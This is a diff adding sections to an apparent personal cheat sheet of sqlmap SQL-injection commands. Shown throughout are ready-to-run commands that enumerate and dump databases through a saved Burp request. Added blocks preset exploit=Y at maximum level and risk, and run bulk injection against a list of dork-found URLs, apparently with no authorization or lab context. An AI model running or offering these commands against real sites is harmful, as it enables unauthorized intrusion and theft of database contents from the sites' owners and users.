@@ -51,5 +51,27 @@ sqlmap -r burp.req --batch --dbs
 sqlmap -r burp.req --batch -D somedb --tables
 sqlmap -r burp.req --batch -D somedb -T sometble --dump --threads 10
 
+
+=================================== 
+Auto-Answered
+
+sqlmap -u 'http://site/product?id=1' -p 'id' --batch --random-agent 
+--level=5 --risk=3 --thread 5 --dbs --output-dir="/tmp/"
+--answer="extending=N,follow=N,keep=N,exploit=Y"
+- extending: increase level and risk.
+- follow: follow redirection.
+- keep: keep running or not if connection timeout.
+- exploit: exploit or not if target exploitable.
+
+
+=================================== 
+Dork List
+
+sqlmap -m dorks.txt --batch --answer="extending=N,follow=N,keep=N,exploit=Y" --level=5 --risk=3 --dbs
+cat dorks.txt                                                                                        
+http://siteone/include/chart_generator.php?session=1
+http://sitetwo/pandora_console/include/whatever?param=555
+
+
 =================================== 
 Consider: mxweb mxcurls
